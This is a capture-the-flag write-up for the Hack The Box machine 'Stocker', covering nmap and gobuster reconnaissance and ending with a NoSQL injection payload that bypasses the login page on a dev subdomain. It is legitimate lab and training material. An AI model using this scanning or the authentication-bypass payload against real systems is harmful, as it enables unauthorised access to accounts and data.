# HTB Machine Stocker


we atart with nmap scan:
```Shell
┌──(Jack㉿Sparrow)-[~/Downloads/htb/stocker]
└─$ sudo nmap -sS -sC -T5 10.10.11.196 -oN nmap.txt
[sudo] password for Jack: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-30 02:18 EDT
Nmap scan report for 10.10.11.196
Host is up (0.68s latency).
Not shown: 938 closed tcp ports (reset), 60 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 3d12971d86bc161683608f4f06e6d54e (RSA)
|   256 7c4d1a7868ce1200df491037f9ad174f (ECDSA)
|_  256 dd978050a5bacd7d55e827ed28fdaa3b (ED25519)
80/tcp open  http
|_http-title: Did not follow redirect to http://stocker.htb

Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds                                                           
```

we have 2 ports open: 22(ssh) , 80(http)

add `stocker.htb` to `/etc/hosts` file

visiting this page we see one comment from `Angoose Garden, Head of IT at Stockers Ltd.`

next we try to bruteforce subdomains:
```Shell
┌──(Jack㉿Sparrow)-[~]
└─$ gobuster vhost -u stocker.htb -w /usr/share/wordlists/dirb/common.txt  --append-domain  -t 100
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         100
[+] Wordlist:        /usr/share/wordlists/dirb/common.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/03/30 02:44:46 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/30 02:45:04 Finished
===============================================================
```

again we need to add `dev.stocker.htb` to `/etc/hosts` file

after few try and errors we found that login page is vulnerable to NoSQL Injection.

`Content-Type: application/json`

Payload: `{"username": {"$ne": null}, "password": {"$ne": null}}`




